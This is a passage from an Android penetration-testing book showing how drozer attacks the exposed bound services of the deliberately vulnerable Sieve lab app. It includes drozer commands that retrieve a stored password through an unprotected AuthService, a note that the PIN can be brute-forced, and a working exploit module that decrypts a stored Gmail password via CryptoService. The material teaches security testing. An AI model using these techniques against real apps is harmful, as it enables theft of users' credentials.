.android.com/guide/components/bound-services.html.
Attacking a Messenger Implementation
The attack surface of each service depends on what is being exposed by the technique in use. The easiest starting
point for examining bound services making use of messengers is reading the handleMessage() method in the
service code. This tells you what kinds of messages are expected and how the application executes different
functions accordingly. After you discover an attack path, you can investigate and interact with it from drozer
using the app.service.send module. The Sieve application contains two exposed services that both implement
messengers. We discovered this by first finding these services and then reading their classes and checking which
one of the explained techniques was applied.
dz> run app.service.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
com.mwr.example.sieve.AuthService
Permission: null
com.mwr.example.sieve.CryptoService
Permission: null
Looking at the AuthService source code reveals that it deals with the checking of passwords and PIN codes
entered by the application. The following shows some important constants defined and a commented high-level
view of the source code of the handleMessage()function:
...
static final int MSG_CHECK = 2354;
static final int MSG_FIRST_LAUNCH = 4;
static final int MSG_SET = 6345;
...
public void handleMessage(Message r9_Message) {
...
Bundle r0_Bundle = (Bundle) r9_Message.obj;
...
switch (r9_Message.what) {
case MSG_FIRST_LAUNCH:
...
//Check if pin and password are set
...
case MSG_CHECK:
...
if (r9_Message.arg1 == 7452) {
...
//Return pin
//Requires password from bundle
...
}
} else if (r9_Message.arg1 == 9234) {
...
//Returns password
//Requires pin from bundle
...
}
} else {
sendUnrecognisedMessage();
return;
}
...
case MSG_SET:
if (r9_Message.arg1 == 7452) {
...
//Set password
//Requires current password from bundle
...
} else if (r9_Message.arg1 == 9234) {
...
//Set pin
//Requires current pin from bundle
...
}
} else {
sendUnrecognisedMessage();
return;
}
...
}
...
}
Earlier in this chapter we noted that the Sieve application encrypts each of the passwords in its database.
Further investigation of the code used to encrypt these passwords would reveal that the master key for the
application is used as direct input to the key for the AES algorithm that is used. If no other vulnerability exists
in Sieve that allows the retrieval of the password or pin, the AuthService could still be abused for this
information—in particular, the code path that allows another application to retrieve the password if the pin is
provided. The following shows this attack in drozer:
dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve
.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve
.PIN 1234 --bundle-as-obj
Got a reply from com.mwr.example.sieve/com.mwr.example.sieve
.AuthService:
what: 5
arg1: 41
arg2: 0
Extras
com.mwr.example.sieve.PASSWORD (String) : Thisismylongpassword123
The password was successfully retrieved. If an attacking application did not know the PIN code, it could
comfortably brute-force this value because it is only four characters long. This attack could be performed
manually or in an automated fashion by an application. Sending an incorrect pin of 7777 yields the following
response, which only reflects the entered pin:
dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve
.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve
.PIN 7777 --bundle-as-obj
Got a reply from com.mwr.example.sieve/com.mwr.example.sieve
.AuthService:
what: 5
arg1: 41
arg2: 1
Extras
com.mwr.example.sieve.PIN (String) : 7777
The differences in responses to a valid PIN and an invalid PIN make it possible for an automated brute-forcer to
know when it stumbles upon the correct PIN. The CryptoService service exposed by Sieve takes input and uses
the provided key to encrypt or decrypt the data. Here is a view of the code that handles this:
...
public static final String KEY = "com.mwr.example.sieve.KEY";
public static final int MSG_DECRYPT = 13476;
public static final int MSG_ENCRYPT = 3452;
public static final String PASSWORD = "com.mwr.example.sieve.PASSWORD";
public static final String RESULT = "com.mwr.example.sieve.RESULT";
public static final String STRING = "com.mwr.example.sieve.STRING";
...
public void handleMessage(Message r7_Message) {
...
Bundle r0_Bundle = (Bundle) r7_Message.obj;
switch (r7_Message.what) {
case MSG_ENCRYPT:
r0_Bundle.putByteArray(RESULT,
CryptoService.this.encrypt(
r0_Bundle.getString(KEY),
r0_Bundle.getString(STRING)));
...
case MSG_DECRYPT:
r0_Bundle.putString(RESULT,
CryptoService.this.decrypt(
r0_Bundle.getString(KEY),
r0_Bundle.getByteArray(PASSWORD)));
...
}
...
}
}
To encrypt a string using this service, the what parameter should be 3452 and the com.mwr.example.sieve.KEY
and com.mwr.example.sieve.STRING values should be part of the bundle sent. Use drozer to test an encryption
operation as follows:
dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve
.CryptoService --msg 3452 2 3 --extra string com.mwr.example.sieve
.KEY testpassword --extra string com.mwr.example.sieve.STRING "string to
be encrypted" --bundle-as-obj
Got a reply from com.mwr.example.sieve/com.mwr.example.sieve
.CryptoService:
what: 9
arg1: 91
arg2: 2
Extras
com.mwr.example.sieve.RESULT (byte[]) : [89, 95, -78, 115, -23,
-50, -34, -30, -107, -1, -41, -35, 0, 7, 94, -77, -73, 90, -6, 79,
-60, 122, -12, 25, -118, 62, -3, -112, -94, 34, -41, 14, -126, -101,
-48, -99, -55, 10]
com.mwr.example.sieve.STRING (String) : string to be encrypted
com.mwr.example.sieve.KEY (String) : testpassword
A byte array is returned with the ciphertext. Interacting with this service’s decryption functionality is tricky
because the code expects a byte array containing the encrypted password (as com.mwr.example.sieve.PASSWORD).
The sending of byte arrays is not directly supported from drozer’s app.service.send module; you have to create
your own module to do the job. Here is an example module to do this:
import base64
from drozer import android
from drozer.modules import common, Module
class Decrypt(Module, common.ServiceBinding):
name = "Decrypt Sieve passwords"
description = "Decrypt a given password with the provided key"
examples = ""
author = "MWR InfoSecurity (@mwrlabs)"
date = "2014-07-22"
license = "BSD (3 clause)"
path = ["exploit", "sieve", "crypto"]
permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]
def add_arguments(self, parser):
parser.add_argument("key", help="AES key")
parser.add_argument("base64_ciphertext", help=
"the base64 ciphertext string to be decrypted")
def execute(self, arguments):
# Create a bundle with the required user input
bundle = self.new("android.os.Bundle")
bundle.putString("com.mwr.example.sieve.KEY", arguments.key)
bundle.putByteArray("com.mwr.example.sieve.PASSWORD",
self.arg(base64.b64decode(arguments.base64_ciphertext),
obj_type="data"))
# Define service endpoint and parameters
binding = self.getBinding("com.mwr.example.sieve",
"com.mwr.example.sieve.CryptoService")
binding.setBundle(bundle)
binding.setObjFormat("bundleAsObj")
# Send message and receive reply
msg = (13476, 1, 1)
if binding.send_message(msg, 5000):
self.stdout.write("%s\n" % binding.getData())
else:
self.stderr.write("An error occured\n")
TIP
Observing the preceding code you will notice that a new android.os.Bundle object was instantiated using
the the self.new() method. This is drozer’s built-in method to instantiate an instance of a class using
reflection. You will see this method being used often in drozer modules.
The user’s encrypted Gmail password retrieved from exploiting the content provider earlier was
zA76WR9mURDNNEw4TUiidVKRuKLEamg5h84T. Testing this module with this value and the master password yields
the following result:
dz> run exploit.sieve.crypto.decrypt Thisismylongpassword123 zA76WR9mURD
NNEw4TUiidVKRuKLEamg5h84T
Extras
com.mwr.example.sieve.PASSWORD (byte[]) : [-52, 14, -6, 89, 31, 102,
81, 16, -51, 52, 76, 56, 77, 72, -94, 117, 82, -111, -72, -94,
-60, 106, 104, 57, -121, -50, 19]
com.mwr.example.sieve.RESULT (String) : password123
com.mwr.example.sieve.KEY (String) : Thisismylongpassword123
The user’s Gmail password is shown in the com.mwr.example.sieve.RESULT value as password123.
TIP
When sending intents of any nature to an application component, observing the output of logcat at the
time the intent is sent is often insightful. This may provide useful information for debugging your attack
parameters or confirming success.
When using bound services, you may, depending on a multitude of factors, have to write custom code. Each
developer implements small things differently, like how the Bundle is retrieved from the Message object. The
default way in which drozer expects that an application will receive its Bundle is by using the getData() method
on the Message object. However, some developers may use a different way to do this. For instance, Sieve casts
the obj attribute of the Message object directly to a Bundle. This means that if the correct method is not used
when sending the message to the bound service, it will result in strange errors such as null pointer exceptions.
Sieve uses the following code to receive its Bundle:
Bundle r0_Bundle = (Bundle) r9_Message.obj;
This means that when using the app.service.send module, you need to use the --bundle-as-obj flag.
Attacking an AIDL Implementation
Services that make use of AIDL are some of the most cumbersome aspects to test on Android applications
because the client that connects to the service needs to be custom written each time. The tester must generate a
class that implements the Binder interface by using its AIDL file. To convert this file from a .aidl file into a
.java file you use the aidl binary that comes in the build-tools folder in the Android SDK:
$ ./aidl /path/to/service.aidl
After compiling this to a Java source file, you can import it into a custom application for testing or class-loaded
inside drozer. Class-loading is easy inside drozer; here is a simple example module (classloading.py):
from drozer.modules import common, Module
from drozer.modules.common import loader
class Classloading(Module, loader.ClassLoader):
name = "Classloading example"
description = "Classloading example"
examples = ""
author = ["Tyrone (MAHH)"]
date = "2014-07-29"
license = "BSD (3 clause)"
path = ["app", "test"]
def add_arguments(self, parser):
parser.add_argument("name", default=None, help="your name")
def execute(self, arguments):
# Class load the new class - this will be automatically compiled
classloadtest = self.loadClass("app/ClassLoadTest.apk",
"ClassLoadTest")
# Create an instance of our class with name as argument
clt = self.new(classloadtest, arguments.name)
# Invoke Java function!
print clt.sayHello()
The class that was loaded in the previous code is written in Java and named ClassLoadTest.java. It is very basic
and allows you to instantiate it with a name and contains a method that returns a friendly message containing
the name. This is shown here:
public class ClassLoadTest
{
String name;
public ClassLoadTest(String n)
{
this.name = n;
}
public String sayHello()
{
return "Hi " + this.name + "!";
}
}
By placing the Java file in the relative location specified in the self.loadClass() function, it will automatically
get compiled and converted into an APK for use inside drozer. Running this new module in drozer is simple:
dz> run app.test.classloading Tyrone
Hi Tyrone!
ERRORS COMPILING CUSTOM JAVA CLASSES
Making use of any version of javac other than 1.6 will result in errors during compilation that look similar
to the following:
trouble processing:
bad class file magic (cafebabe) or version (0033.0000)
...while parsing ClassLoadTest.class